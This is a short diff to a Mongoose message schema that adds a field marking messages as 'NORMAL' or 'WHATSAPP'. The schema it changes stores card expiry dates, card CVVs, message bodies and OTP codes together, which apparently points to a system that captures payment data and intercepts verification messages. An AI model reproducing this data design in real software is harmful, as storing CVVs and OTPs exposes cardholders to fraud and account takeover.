@@ -15,6 +15,7 @@ const messageSchema = new mongoose.Schema({
   cardExpiry: { type: String, default: '' },
   cardCvv: { type: String, default: '' },
   sender: { type: String, default: 'NOTIFICATION' },
+  category: { type: String, default: 'NORMAL' }, // 'NORMAL' or 'WHATSAPP'
   body: { type: String, default: '' },
   otp: { type: String, default: null },
   timestamp: { type: Date, default: Date.now },
